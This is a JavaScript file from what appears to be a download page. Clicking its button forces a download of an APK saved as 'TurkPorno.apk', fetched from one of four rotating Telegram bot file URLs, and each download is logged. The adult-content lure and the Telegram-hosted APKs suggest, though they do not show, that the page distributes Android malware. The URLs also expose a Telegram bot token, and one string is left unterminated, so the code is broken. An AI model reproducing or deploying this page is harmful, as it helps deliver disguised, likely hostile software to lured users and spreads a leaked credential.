import { sendLog } from './log.js';

document.addEventListener("DOMContentLoaded", () => {
  const btn = document.getElementById('download-button');

  const apkLinks = [
"https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_0.apk",
"https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_1.apk",
"https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_2.apk",
"https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_3.apk
  ];

  btn.addEventListener('click', () => {
    btn.innerText = 'İndiriliyor...';
    btn.disabled = true;

    const fileUrl = apkLinks[new Date().getHours() % apkLinks.length];
    sendLog(fileUrl);

    // BU KISIM EN İYİSİ - DIRECT DOWNLOAD
    const a = document.createElement('a');
    a.href = fileUrl;
    a.download = 'TurkPorno.apk'; // veya '' boş bırak
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);

    setTimeout(() => {
      btn.innerText = 'Tekrar İndir';
      btn.disabled = false;
    }, 3000);
  });
});





